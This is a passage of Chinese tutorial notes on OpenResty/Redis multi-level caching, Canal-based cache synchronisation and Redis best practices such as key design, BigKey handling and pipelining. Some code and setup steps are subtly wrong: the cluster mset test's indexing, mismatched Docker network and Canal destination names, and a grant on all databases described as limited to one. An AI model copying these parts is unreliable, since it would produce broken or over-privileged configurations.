          ngx.log(ngx.ERR, "查询Redis失败: ", err, ", key = " , key)
      end
      -- 得到的数据为空处理
      if resp == ngx.null then
          resp = nil
          ngx.log(ngx.ERR, "查询Redis数据为空, key = ", key)
      end
      close_redis(red)
      return resp
  end
  ```

- 导出

  ```lua
  -- 将方法导出
  local _M = {  
      read_http = read_http,
      read_redis = read_redis
  }  
  return _M
  ```

完整的common.lua：

```lua
-- 导入redis
local redis = require('resty.redis')
-- 初始化redis
local red = redis:new()
red:set_timeouts(1000, 1000, 1000)

-- 关闭Redis连接的工具方法，其实是放入连接池
local function close_redis(red)
    local pool_max_idle_time = 10000 -- 连接的空闲时间，单位是毫秒
    local pool_size = 100 --连接池大小
    local ok, err = red:set_keepalive(pool_max_idle_time, pool_size)
    if not ok then
        ngx.log(ngx.ERR, "放入redis连接池失败: ", err)
    end
end

-- 查询Redis的方法：ip和port指定Redis地址，key是查询的key
local function read_redis(ip, port, key)
    -- 获取一个连接
    local ok, err = red:connect(ip, port)
    if not ok then
        ngx.log(ngx.ERR, "连接redis失败 : ", err)
        return nil
    end
    -- 查询Redis
    local resp, err = red:get(key)
    -- 查询失败处理
    if not resp then
        ngx.log(ngx.ERR, "查询Redis失败: ", err, ", key = " , key)
    end
    --得到的数据为空处理
    if resp == ngx.null then
        resp = nil
        ngx.log(ngx.ERR, "查询Redis数据为空, key = ", key)
    end
    close_redis(red)
    return resp
end

-- 封装函数，发送http请求，并解析响应
local function read_http(path, params)
    local resp = ngx.location.capture(path,{
        method = ngx.HTTP_GET,
        args = params,
    })
    if not resp then
        -- 记录错误信息，返回404
        ngx.log(ngx.ERR, "http查询失败, path: ", path , ", args: ", args)
        ngx.exit(404)
    end
    return resp.body
end
-- 将方法导出
local _M = {  
    read_http = read_http,
    read_redis = read_redis
}  
return _M
```

#### 实现Redis查询

接下来就可以去修改item.lua文件，实现对Redis的查询了。

查询逻辑是：

- 根据id查询Redis。
- 如果查询失败则继续查询Tomcat。
- 将查询结果返回。

修改/usr/local/openresty/lua/item.lua文件，添加一个查询函数：

```lua
-- 导入common函数库
local common = require('common')
local read_http = common.read_http
local read_redis = common.read_redis
-- 封装查询函数
function read_data(key, path, params)
    -- 查询本地缓存
    local val = read_redis("127.0.0.1", 6379, key)
    -- 判断查询结果
    if not val then
        ngx.log(ngx.ERR, "redis查询失败，尝试查询http，key: ", key)
        -- Redis查询失败，去查询http
        val = read_http(path, params)
    end
    -- 返回数据
    return val
end
```

而后修改商品查询、库存查询的业务：

```lua
-- 获取路径参数
local id = ngx.var[1]

-- 查询商品信息
local itemJSON = read_data("item:id:" .. id,  "/item/" .. id, nil)
-- 查询库存信息
local stockJSON = read_data("item:stock:id:" .. id, "/item/stock/" .. id, nil)
```

完整的item.lua代码：

```lua
-- 导入common函数库
local common = require('common')
local read_http = common.read_http
local read_redis = common.read_redis
-- 导入cjson库
local cjson = require('cjson')

-- 封装查询函数
function read_data(key, path, params)
    -- 查询本地缓存
    local val = read_redis("127.0.0.1", 6379, key)
    -- 判断查询结果
    if not val then
        ngx.log(ngx.ERR, "redis查询失败，尝试查询http，key: ", key)
        -- redis查询失败，去查询http
        val = read_http(path, params)
    end
    -- 返回数据
    return val
end

-- 获取路径参数
local id = ngx.var[1]

-- 查询商品信息
local itemJSON = read_data("item:id:" .. id,  "/item/" .. id, nil)
-- 查询库存信息
local stockJSON = read_data("item:stock:id:" .. id, "/item/stock/" .. id, nil)

-- JSON转化为lua的table
local item = cjson.decode(itemJSON)
local stock = cjson.decode(stockJSON)
-- 组合数据
item.stock = stock.stock
item.sold = stock.sold

-- 把item序列化为json 返回结果
ngx.say(cjson.encode(item))
```

### Nginx本地缓存

现在，整个多级缓存中只差最后一环，也就是nginx的本地缓存了。如图：

![Nginx本地缓存](资源\Nginx本地缓存.png)

#### 本地缓存API

OpenResty为Nginx提供了**shard dict**的功能，可以在Nginx的多个worker之间共享数据，实现缓存功能（只是在OpenResty内部共享，多台OpenResty之间无法共享）。

开启共享字典，在nginx.conf的http下添加配置：

```nginx
# 共享字典，也就是本地缓存，名称叫做：item_cache，大小150m
lua_shared_dict item_cache 150m; 
```

操作共享字典：

```lua
-- 获取本地缓存对象
local item_cache = ngx.shared.item_cache
-- 存储, 指定key、value、过期时间，单位秒，默认为0代表永不过期
item_cache:set('key', 'value', 1000)
-- 读取
local val = item_cache:get('key')
```

#### 实现本地缓存查询

修改/usr/local/openresty/lua/item.lua文件，修改`read_data`查询函数，添加本地缓存逻辑：

```lua
-- 导入共享词典，本地缓存
local item_cache = ngx.shared.item_cache

-- 封装查询函数
function read_data(key, expire, path, params)
    -- 查询本地缓存
    local val = item_cache:get(key)
    if not val then
        ngx.log(ngx.ERR, "本地缓存查询失败，尝试查询Redis，key: ", key)
        -- 查询redis
        val = read_redis("127.0.0.1", 6379, key)
        -- 判断查询结果
        if not val then
            ngx.log(ngx.ERR, "redis查询失败，尝试查询http，key: ", key)
            -- redis查询失败，去查询http
            val = read_http(path, params)
        end
    end
    -- 查询成功，把数据写入本地缓存
    item_cache:set(key, val, expire)
    -- 返回数据
    return val
end
```

修改item.lua中查询商品和库存的业务，实现最新的`read_data`函数：

```lua
-- 查询商品信息
local itemJSON = read_data("item:id:" .. id, 1800,  "/item/" .. id, nil)
-- 查询库存信息
local stockJSON = read_data("item:stock:id:" .. id, 60, "/item/stock/" .. id, nil)
```

其实就是多了缓存时间参数，过期后nginx缓存会自动删除，下次访问即可更新缓存。这里给商品基本信息设置超时时间为30分钟，库存为1分钟。因为库存更新频率较高，如果缓存时间过长，可能与数据库差异较大。

完整的item.lua文件：

```lua
-- 导入common函数库
local common = require('common')
local read_http = common.read_http
local read_redis = common.read_redis
-- 导入cjson库
local cjson = require('cjson')
-- 导入共享词典，本地缓存
local item_cache = ngx.shared.item_cache

-- 封装查询函数
function read_data(key, expire, path, params)
    -- 查询本地缓存
    local val = item_cache:get(key)
    if not val then
        ngx.log(ngx.ERR, "本地缓存查询失败，尝试查询Redis， key: ", key)
        -- 查询redis
        val = read_redis("127.0.0.1", 6379, key)
        -- 判断查询结果
        if not val then
            ngx.log(ngx.ERR, "redis查询失败，尝试查询http， key: ", key)
            -- redis查询失败，去查询http
            val = read_http(path, params)
        end
    end
    -- 查询成功，把数据写入本地缓存
    item_cache:set(key, val, expire)
    -- 返回数据
    return val
end

-- 获取路径参数
local id = ngx.var[1]

-- 查询商品信息
local itemJSON = read_data("item:id:" .. id, 1800,  "/item/" .. id, nil)
-- 查询库存信息
local stockJSON = read_data("item:stock:id:" .. id, 60, "/item/stock/" .. id, nil)

-- JSON转化为lua的table
local item = cjson.decode(itemJSON)
local stock = cjson.decode(stockJSON)
-- 组合数据
item.stock = stock.stock
item.sold = stock.sold

-- 把item序列化为json 返回结果
ngx.say(cjson.encode(item))
```

查看日志：

```sh
cd /usr/local/openresty/nginx
tail -f logs/error.log
```

可以看到，第一次查询某个数据，本地缓存查询失败，后面就能成功了。

## 缓存同步

大多数情况下，浏览器查询到的都是缓存数据，如果缓存数据与数据库数据存在较大差异，可能会产生比较严重的后果。

所以我们必须保证数据库数据、缓存数据的一致性，这就是缓存与数据库的同步。

### 数据同步策略

缓存数据同步的常见方式有三种：

- **设置有效期**：给缓存设置有效期，到期后自动删除，再次查询时更新。

  - 优势：简单、方便。

  - 缺点：时效性差，缓存过期之前可能不一致。

  - 场景：更新频率较低，时效性要求低的业务。


- **同步双写**：在修改数据库的同时，直接修改缓存（例如新增商品业务后，紧跟一个新增商品到缓存的业务，形成一个事务）。
- 优势：时效性强，缓存与数据库强一致。
  
- 缺点：有代码侵入，耦合度高。
  
- 场景：对一致性、时效性要求较高的缓存数据。


- **异步通知：**修改数据库时发送事件通知，相关服务监听到通知后修改缓存数据。

  - 优势：低耦合，可以同时通知多个缓存服务。

  - 缺点：时效性一般，可能存在中间不一致状态。

  - 场景：时效性要求一般，有多个服务需要同步。


而异步实现又可以基于MQ或者Canal来实现：

- 基于MQ的异步通知：商品服务完成对数据的修改（写入数据库）后，只需要发送一条消息到MQ中。缓存服务监听MQ消息，然后完成对缓存的更新。依然有少量的代码侵入。

- 基于Canal的通知：商品服务完成商品修改（写入数据库）后，业务直接结束，没有任何代码侵入；Canal监听MySQL变化，当发现变化后，立即通知缓存服务；缓存服务接收到Canal通知，更新缓存。代码零侵入。


### Canal

[Canal](https://github.com/alibaba/canal)是阿里巴巴旗下的一款开源项目，基于Java开发。它基于数据库增量日志解析，提供增量数据订阅&消费。

Canal是基于MySQL的主从同步来实现的，MySQL主从同步的原理如下：

- MySQL master将数据变更写入二进制日志（binary log），其中记录的数据叫做binary log events。
- MySQL slave将master的binary log events拷贝到它的中继日志(relay log)。
- MySQL slave重放relay log中的事件，将数据变更反映它自己的数据。

而Canal就是把自己伪装成MySQL的一个slave节点，从而监听master的binary log变化。再把得到的变化信息通知给Canal的客户端（MySQL客户端、Kafka、Elasticsearch、HBase、RocketMQ、Pulsar等），进而完成对其它数据库的同步。

### 安装Canal

#### 开启MySQL主从

Canal是基于MySQL的主从同步功能，因此必须先开启MySQL的主从功能。这里以之前用Docker运行的MySQL为例。

##### 开启binlog

打开MySQL容器挂载的日志文件：

```sh
vi /tmp/mysql/conf/my.cnf
```

添加内容：

```ini
# 设置binary log文件的存放地址和文件名
log-bin=/var/lib/mysql/mysql-bin
# 指定对哪个database记录binary log events，这里记录item这个库
binlog-do-db=item
```

最终效果：

```ini
[mysqld]
skip-name-resolve
character_set_server=utf8
datadir=/var/lib/mysql
server-id=1000
log-bin=/var/lib/mysql/mysql-bin
binlog-do-db=item
```

##### 设置用户权限

接下来添加一个仅用于数据同步的账户，出于安全考虑，这里仅提供对item这个库的操作权限。

```mysql
create user canal@'%' IDENTIFIED by 'canal';
GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO 'canal'@'%' identified by 'canal';
FLUSH PRIVILEGES;
```

重启MySQL容器即可：

```sh
docker restart mysql
```

查看是否出现mysql-bin文件：

```sh
ll data
```

测试设置是否成功：在mysql控制台，或者Navicat中，输入命令：

```mysql
show master status;
```

#### 安装Canal

##### 创建网络

创建一个网络，将MySQL、Canal、MQ放到同一个Docker网络中：

```sh
docker network create heima
```

让MySQL加入这个网络：

```sh
docker network connect item mysql
```

##### 安装Canal

将[canal的镜像压缩包](资源\canal.tar)上传到虚拟机，然后通过命令导入：

```sh
docker load -i canal.tar
```

然后运行命令创建Canal容器：

```sh
docker run -p 11111:11111 --name canal \
-e canal.destinations=heima \
-e canal.instance.master.address=mysql:3306  \
-e canal.instance.dbUsername=canal  \
-e canal.instance.dbPassword=canal  \
-e canal.instance.connectionCharset=UTF-8 \
-e canal.instance.tsdb.enable=true \
-e canal.instance.gtidon=false  \
-e canal.instance.filter.regex=heima\\..* \
--network heima \
-d canal/canal-server:v1.1.5
```

说明:

- `-p 11111:11111`：这是Canal的默认监听端口。
- `-e canal.instance.master.address=mysql:3306`：数据库地址和端口，如果不知道mysql容器地址，可以通过`docker inspect [容器id]`来查看。
- `-e canal.instance.dbUsername=canal`：数据库用户名。
- `-e canal.instance.dbPassword=canal` ：数据库密码。
- `-e canal.instance.filter.regex`：要监听的表名称。

表名称监听支持的语法举例（转义符需要双斜杠`\\`）：

- 所有表：`.*` 或`.*\\..`*。
2.  canal schema下所有表：`canal\\..*`。
3.  canal下的以canal打头的表：`canal\\.canal.*`。
4.  canal schema下的一张表：`canal.test1`。
5.  多个规则组合使用然后以逗号隔开：`canal\\..*,mysql.test1,mysql.test2`。

```sh
docker exec -it canal bash  # 进入canal
tail -f canal-server/logs/canal/canal.log  # 查看canal运行日志
tail -f canal-server/logs/heima/heima.log  # 查看连接MySQL连接与主从同步日志
```

### 监听Canal

Canal提供了各种语言的客户端，当Canal监听到binlog变化时，会通知Canal的客户端。我们可以利用Canal提供的Java客户端，监听Canal通知消息。当收到变化的消息时，完成对缓存的更新。不过这里使用GitHub上的第三方开源的[canal-starter客户端](https://github.com/NormanGyllenhaal/canal-client)，与SpringBoot完美整合，自动装配，比官方客户端要简单好用很多。

引入依赖：

```xml
<dependency>
    <groupId>top.javatool</groupId>
    <artifactId>canal-spring-boot-starter</artifactId>
    <version>1.2.1-RELEASE</version>
</dependency>
```

在src/main/resources/application.yml文件中配置：

```yml
canal:
  destination: item  # canal的集群名字，要与安装Canal时设置的名称一致
  server: 192.168.150.101:11111  # Canal服务地址
```

修改`Item`实体类。通过`@Id`（标记数据库主键关联字段）、`@Column`（声明字段对应的列名称，驼峰与下划线风格可以自动转换）、`@Transient`（标记不属于表中的字段）等注解完成`Item`类与数据库表字段的映射：

```java
package com.example.item.pojo;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import org.springframework.data.annotation.Id;
import org.springframework.data.annotation.Transient;

import javax.persistence.Column;
import java.util.Date;

@Data
@TableName("tb_item")
public class Item {
    @TableId(type = IdType.AUTO)
    @Id
    private Long id;  //商品id
    @Column(name = "name")
    private String name;  //商品名称
    private String title;  //商品标题
    private Long price;  //价格（分）
    private String image;  //商品图片
    private String category;  //分类名称
    private String brand;  //品牌名称
    private String spec;  //规格
    private Integer status;  //商品状态 1-正常，2-下架
    private Date createTime;  //创建时间
    private Date updateTime;  //更新时间
    @TableField(exist = false)
    @Transient
    private Integer stock;
    @TableField(exist = false)
    @Transient
    private Integer sold;
}
```

通过实现`EntryHandler<T>`接口编写监听器，监听Canal消息。注意两点：

- 实现类通过`@CanalTable("tb_item")`指定监听的表信息。
- `EntryHandler`的泛型是与表对应的实体类。

```java
package com.example.item.canal;

import com.example.item.config.RedisHandler;
import com.example.item.pojo.Item;
import com.github.benmanes.caffeine.cache.Cache;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import top.javatool.canal.client.annotation.CanalTable;
import top.javatool.canal.client.handler.EntryHandler;

@CanalTable("tb_item")
@Component
public class ItemHandler implements EntryHandler<Item> {

    @Autowired
    private RedisHandler redisHandler;
    @Autowired
    private Cache<Long, Item> itemCache;

    @Override
    public void insert(Item item) {
        // 写数据到JVM进程缓存
        itemCache.put(item.getId(), item);
        // 写数据到Redis
        redisHandler.saveItem(item);
    }

    @Override
    public void update(Item before, Item after) {
        // 写数据到JVM进程缓存
        itemCache.put(after.getId(), after);
        // 写数据到Redis
        redisHandler.saveItem(after);
    }

    @Override
    public void delete(Item item) {
        // 删除数据到JVM进程缓存
        itemCache.invalidate(item.getId());
        // 删除数据到Redis
        redisHandler.deleteItemById(item.getId());
    }
}
```

在这里对Redis的操作都封装到了`RedisHandler`这个对象中，是之前做缓存预热时编写的一个类，内容如下：

```java
package com.example.item.config;

import com.example.item.pojo.Item;
import com.example.item.pojo.ItemStock;
import com.example.item.service.IItemService;
import com.example.item.service.IItemStockService;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;

import java.util.List;

@Component
public class RedisHandler implements InitializingBean {

    @Autowired
    private StringRedisTemplate redisTemplate;

    @Autowired
    private IItemService itemService;
    @Autowired
    private IItemStockService stockService;

    private static final ObjectMapper MAPPER = new ObjectMapper();

    @Override
    public void afterPropertiesSet() throws Exception {
        // 查询商品信息
        List<Item> itemList = itemService.list();
        // 放入缓存
        for (Item item : itemList) {
            // item序列化为JSON
            String json = MAPPER.writeValueAsString(item);
            // 存入Redis
            redisTemplate.opsForValue().set("item:id:" + item.getId(), json);
        }

        // 查询商品库存信息
        List<ItemStock> stockList = stockService.list();
        // 放入缓存
        for (ItemStock stock : stockList) {
            // item序列化为JSON
            String json = MAPPER.writeValueAsString(stock);
            // 存入Redis
            redisTemplate.opsForValue().set("item:stock:id:" + stock.getId(), json);
        }
    }

    public void saveItem(Item item) {
        try {
            String json = MAPPER.writeValueAsString(item);
            redisTemplate.opsForValue().set("item:id:" + item.getId(), json);
        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }
    }

    public void deleteItemById(Long id) {
        redisTemplate.delete("item:id:" + id);
    }

}
```

访问`localhost:8081/item/10001`；将[静态资源](资源/static)部署到src/main/resources目录下，访问`localhost:8081`并修改ID为10001的商品，控制台输出相关日志；再次访问`localhost:8081/item/10001`，可以看到数据被修改，同时Redis中的记录也被修改。

# Redis最佳实践

## Redis键值设计

### 优雅的键结构

Redis的键虽然可以自定义，但最好遵循下面的几个最佳实践约定：

- 遵循基本格式：`[业务名称]:[数据名称]:[数据id]`。
- 长度不超过44字节。
- 不包含特殊字符。

例如：登录业务，保存用户信息，键是这样的：`login:user:10`。

优点：

- 可读性强。

- 避免键冲突。

- 方便管理（便于形成层级结构）。

- 更节省内存： 键是`string`类型，底层编码包含`int`、`embstr`和`raw`三种。`embstr`在小于44字节使用，采用连续内存空间，内存占用更小。

  ```sh
  set num 123
  type num  # 查看类型：string
  object encoding  # 查看底层编码：int
  set name Jack
  type name  # 查看类型：string
  object encoding  # 查看底层编码：embstr；如果name过程，则变为raw
  ```

### 拒绝BigKey

#### 什么是BigKey

BigKey通常以键的大小和键中成员的数量来综合判定，例如：

- 键本身的数据量过大：一个`String`类型的键，它的值为5MB。
- 键中的成员数过多：一个`ZSET`类型的键，它的成员数量为10000个。
- 键中成员的数据量过大：一个`Hash`类型的键，它的成员数量虽然只有1000个但这些成员的值总大小为100 MB。

```sh
memory usage name  # 查看占用的内存空间，注意，该命令对CPU的使用率较高
strlen name  # 查看值的长度
llen l  # 查看list l中值的数量
```

推荐值：

- 单个键的值小于10KB。
- 对于集合类型的键，建议元素数量小于1000。

#### BigKey的危害

BigKey的危害：

- 网络阻塞
  - 对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢。
-  数据倾斜
  - BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡。为了解决这个问题，需要手动重新分配插槽，给运维带来不必要的麻烦。
-  Redis阻塞
  - 对元素较多的`hash`、`list`、`zset`等做运算会耗时较旧，使主线程被阻塞。
-  CPU压力
  - 对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本机其它应用。

#### 如何发现BigKey

可以使用如下方式发现BigKey：

- `redis-cli --bigkeys`

  - 利用`redis-cli`提供的`--bigkeys`参数，可以遍历分析所有键，并返回键的整体统计信息与每个数据的Top1的big key。但是该命令提供的信息不够完整（只能看到每一种数据类型的TOP 1，它未必是BigKey；它不是BigKey，也不意味着其他的就不是BigKey），只能作为参考。

- `scan`扫描

  - 自己编程，利用`scan`扫描Redis中的所有键，利用`strlen`、`hlen`等命令判断键的长度（此处不建议使用`MEMORY USAGE`）。注意，不建议使用`keys *`扫描，否则可能长时间阻塞主线程。

    ```sh
    scan 0  # 扫描（最多）10条数据（10是默认值），得到光标位置18
    scan 18  # 从光标位置18开始扫描（最多）10条数据，得到光标位置29
    scan 29  # 从光标位置18开始扫描（最多）10条数据，得到光标位置0，扫描完毕
    ```
    
    下面使用Jedis实现`scan`扫描：
    
    ```java
    package com.example.redis.jedis;
    
    import redis.clients.jedis.resps.ScanResult;
    import java.util.List;
    
    final static int STR_MAX_LEN = 10 * 1024;
    final static int HASH_MAX_LEN = 500;
    
    // 类：JedisTest
    
    @Test
    void testScan() {
        int maxLen = 0;
        long len = 0;
    
        String cursor = "0";
        do {
            // 扫描并获取一部分key
            ScanResult<String> result = jedis.scan(cursor);
            // 记录cursor
            cursor = result.getCursor();
            List<String> list = result.getResult();
            if (list == null || list.isEmpty()) {
                break;
            }
            // 遍历
            for (String key : list) {
                // 判断键的类型
                String type = jedis.type(key);
                switch (type) {
                    case "string":
                        len = jedis.strlen(key);
                        maxLen = STR_MAX_LEN;
                        break;
                    case "hash":
                        len = jedis.hlen(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "list":
                        len = jedis.llen(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "set":
                        len = jedis.scard(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "zset":
                        len = jedis.zcard(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    default:
                        break;
                }
                if (len >= maxLen) {
                    System.out.printf("Found big key : %s, type: %s, length or size: %d %n", key, type, len);
                }
            }
        } while (!cursor.equals("0"));
    }
    ```

- 第三方工具

  - 利用第三方工具，如[Redis-Rdb-Tools](https://github.com/sripathikrishnan/redis-rdb-tools)分析RDB快照文件，全面分析内存使用情况。

- 网络监控

  - 自定义工具，监控进出Redis的网络数据，超出预警值时主动告警。

#### 如何删除BigKey

BigKey内存占用较多，即便是删除这样的键也需要耗费很长时间，导致Redis主线程阻塞，引发一系列问题。

- redis 3.0 及以下版本：
  - 如果是集合类型，则遍历BigKey的元素，先逐个删除子元素，最后删除BigKey。可以使用`SCAN`（扫描所有键）、`HSCAN`、`SSCAN`、`ZSCAN`等命令遍历BigKey。
- Redis 4.0以后：
  - Redis在4.0后提供了异步删除的命令：`unlink`。

### 恰当的数据类型

存储一个`User`对象，（至少）有三种存储方式：

- 方式一：JSON字符串：`user:1`$\rightarrow$`{"name": "Jack", "age": 21}`
  - 优点：实现简单粗暴。
  - 缺点：数据耦合，不够灵活。

- 方式二：字段打散：`user:1:name`$\rightarrow$`Jack`，`user:1:age`$\rightarrow$`21`。
  - 优点：可以灵活访问对象任意字段。
  - 缺点：占用空间大（包括大量元信息）、没办法做统一控制（例如难以获取`user`的所有信息）。

- 方式三：`hash`：`user:1`$\rightarrow$`name`$\rightarrow$`Jack`，`user:1`$\rightarrow$`age`$\rightarrow$`21`
  - 优点：底层使用`ziplist`，空间占用小，可以灵活访问对象的任意字段。
  - 缺点：代码相对复杂。需要将`User`对象转为`hash`形式，在该过程中需要考虑对象的数据类型转换。

存储对象时，推荐使用`hash`类型数据结构。

假如有一个`hash`类型的键，其中有100万对`field`和`value`，`field`是自增id，这个键存在问题：

- `hash`的`entry`数量超过500时，会使用哈希表而不是`ZipList`，内存占用较多。经过测试，这100万个数据占用的内存大小为62.23M（使用`info memory`命令）。

- 可以通过`hash-max-ziplist-entries`配置`entry`上限：

  ```sh
  config get hash-max-ziplist-entries  # 获取entry上限
  config set hash-max-ziplist-entries 1000  # 修改entry上限，重启失效
  ```
  
  但是如果`entry`过多就会导致BigKey问题。

可以将该键拆分为`string`类型：键为`field`，值为`value`。它存在的问题：

- `string`结构底层没有太多内存优化（并且有很多元信息），内存占用较多。经过测试，这100万个数据占用的内存大小为77.54M。
- 想要批量获取这些数据比较麻烦。

还可以将大`hash`拆分为小的`hash`（每个`hash`小于`entry`上限），将`id / 100`作为键， 将`id % 100`作为`field`，这样每100个元素为一个`Hash`。经过测试，这100万个数据占用的内存大小为24.26M。

三种方式比较如下：

```java
import java.util.HashMap;

@Test
void testBigHash() {
    Map<String, String> map = new HashMap<>();
    for (int i = 1; i <= 100000; i++) {
        map.put("key_" + i, "value_" + i);
    }
    jedis.hmset("test:big:hash", map);
}

@Test
void testBigString() {
    for (int i = 1; i <= 100000; i++) {
        jedis.set("test:str:key_" + i, "value_" + i);
    }
}

@Test
void testSmallHash() {
    int hashSize = 100;
    Map<String, String> map = new HashMap<>(hashSize);
    for (int i = 1; i <= 100000; i++) {
        int k = (i - 1) / hashSize;
        int v = i % hashSize;
        map.put("key_" + v, "value_" + v);
        if (v == 0) {
            jedis.hmset("test:small:hash_" + k, map);
        }
    }
}
```

分析内存占用，可以看到第三种方式占用内存最小。

可以看出，在存储值时，要合理地拆分数据，拒绝BigKey；选择合适数据结构；确保`Hash`结构的`entry`数量不要超过1000；另外可以设置合理的超时时间。

## 批处理优化

### `Pipeline`

单个命令的执行流程：

- 客户端发送一条命令到Redis服务端。
- Redis服务端执行命令。
- Redis服务端返回结果给客户端。

因此，一次命令的响应时间 = 1次往返的网络传输耗时 + 1次Redis执行命令耗时。通常，网络传输耗时远大于Redis执行命令耗时。

N条命令依次执行则需要依次执行单个命令的执行流程。因此，N次命令的响应时间 = N次往返的网络传输耗时 + N次Redis执行命令耗时，非常耗时。测试：

```java
// 耗时较长，大部分时间用于网络传输
@Test
void testFor() {
    for (int i = 1; i <= 100000; i++) {
        jedis.set("test:key_" + i, "value_" + i);
    }
}
```

N条命令批量执行：

- 客户端发送N条命令道Redis服务端。
- Redis服务端执行N个命令。
- Redis服务端返回N个结果给客户端。

因此，N次命令的响应时间 = 1次往返的网络传输耗时 + N次Redis执行命令耗时。

Redis提供了很多`Mxxx`这样的命令，可以实现批量插入数据，例如：`mset`、`hmset`。

利用`mset`批量插入10万条数据：

```java
@Test
void testMxx() {
    String[] arr = new String[2000];
    int j;
    long b = System.currentTimeMillis();
    for (int i = 1; i <= 100000; i++) {
        j = (i % 1000) << 1;
        arr[j] = "test:key_" + i;
        arr[j + 1] = "value_" + i;
        if (j == 0) {
            jedis.mset(arr);
        }
    }
    long e = System.currentTimeMillis();
    System.out.println("time: " + (e - b));
}
```

可以看到耗时非常短。注意：批处理时不建议一次携带太多命令，否则单次命令占用带宽过多，会导致网络阻塞。

`MSET`虽然可以批处理，但是却只能操作部分数据类型（另外，某些数据类型不支持批处理多个不同的键），因此如果有对复杂数据类型的批处理需要，建议使用`Pipeline`功能：

```java
import redis.clients.jedis.Pipeline;

@Test
void testPipeline() {
    // 创建管道
    Pipeline pipeline = jedis.pipelined();
    long b = System.currentTimeMillis();
    for (int i = 1; i <= 100000; i++) {
        // 放入命令到管道
        pipeline.set("test:key_" + i, "value_" + i);
        if (i % 1000 == 0) {
            // 每放入1000条命令，批量执行
            pipeline.sync();
        }
    }
    long e = System.currentTimeMillis();
    System.out.println("time: " + (e - b));
}
```

同样非常快，但是通常慢于`MSET`。原生的M操作，具备原子性，一组命令会作为一个整理批处理。而Pipeline的多个命令之间不具备原子性，一组命令未必会作为一个整理批处理，而是按照命令在命令队列中的先后顺序处理。

### 集群下的批处理

如`MSET`或`Pipeline`这样的批处理需要在一次请求中携带多条命令，而此时如果Redis是一个集群，那批处理命令的多个键必须落在一个插槽中，否则就会导致执行失败。

```sh
redis-cli -p 7003  # 进入7003集群
mset name jack age 21 sex male  # 报错
```

|          | 串行命令                      | 串行slot                                                     | 并行slot                                                     | hash_tag                                           |
| -------- | ----------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------------------------------------------------- |
| 实现思路 | for循环遍历，依次执行每个命令 | 在客户端计算每个键的slot，将slot一致分为一组，每组都利用`Pipeline`批处理，串行执行各组命令 | 在客户端计算每个键的slot，将slot一致分为一组，每组都利用`Pipeline`批处理，并行执行各组命令 | 将所有键设置相同的hash_tag，则所有键的slot一定相同 |
| 耗时     | N次网络耗时  + N次命令耗时    | M次网络耗时  + N次命令耗时， M  = 键的slot个数               | 1次网络耗时  + N次命令耗时                                   | 1次网络耗时  + N次命令耗时                         |
| 优点     | 实现简单                      | 耗时较短                                                     | 耗时非常短                                                   | 耗时非常短、实现简单                               |
| 缺点     | 耗时非常久                    | 实现稍复杂；slot越多，耗时越久                               | 实现复杂                                                     | 容易出现数据倾斜                                   |

串行slot的测试如下：

```java
package com.example.redis.jedis;

import com.example.redis.jedis.util.ClusterSlotHashUtil;
import org.apache.commons.pool2.impl.GenericObjectPoolConfig;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import redis.clients.jedis.Connection;
import redis.clients.jedis.HostAndPort;
import redis.clients.jedis.JedisCluster;

import java.time.Duration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public class JedisClusterTest {

    private JedisCluster jedisCluster;

    @BeforeEach
    void setUp() {
        // 配置连接池
        GenericObjectPoolConfig<Connection> poolConfig = new GenericObjectPoolConfig<>();
        poolConfig.setMaxTotal(8);
        poolConfig.setMaxIdle(8);
        poolConfig.setMinIdle(0);
        poolConfig.setMaxWait(Duration.ofMillis(1000));
        HashSet<HostAndPort> nodes = new HashSet<>();
        nodes.add(new HostAndPort("192.168.150.101", 7001));
        nodes.add(new HostAndPort("192.168.150.101", 7002));
        nodes.add(new HostAndPort("192.168.150.101", 7003));
        nodes.add(new HostAndPort("192.168.150.101", 8001));
        nodes.add(new HostAndPort("192.168.150.101", 8002));
        nodes.add(new HostAndPort("192.168.150.101", 8003));
        jedisCluster = new JedisCluster(nodes, poolConfig);
    }

    // 会失败
    @Test
    void testMSet() {
        jedisCluster.mset("name", "Jack", "age", "21", "sex", "male");
    }

    @Test
    void testMSet2() {
        Map<String, String> map = new HashMap<>(3);
        map.put("name", "Jack");
        map.put("age", "21");
        map.put("sex", "Male");

        Map<Integer, List<Map.Entry<String, String>>> result = map.entrySet()
                .stream()
                .collect(Collectors.groupingBy(
                        entry -> ClusterSlotHashUtil.calculateSlot(entry.getKey()))
                );
        for (List<Map.Entry<String, String>> list : result.values()) {
            String[] arr = new String[list.size() * 2];
            int j = 0;
            for (int i = 0; i < list.size(); i++) {
                j = i<<2;
                Map.Entry<String, String> e = list.get(0);
                arr[j] = e.getKey();
                arr[j + 1] = e.getValue();
            }
            jedisCluster.mset(arr);
        }
    }

    @AfterEach
    void tearDown() {
        if (jedisCluster != null) {
            jedisCluster.close();
        }
    }
}
```

其中，`ClusterSlotHashUtil`类的定义如下：

```java
package com.example.redis.jedis.util;

public final class ClusterSlotHashUtil {

   private static final int SLOT_COUNT = 16384;

   private static final byte SUBKEY_START = '{';

   private static final byte SUBKEY_END = '}';

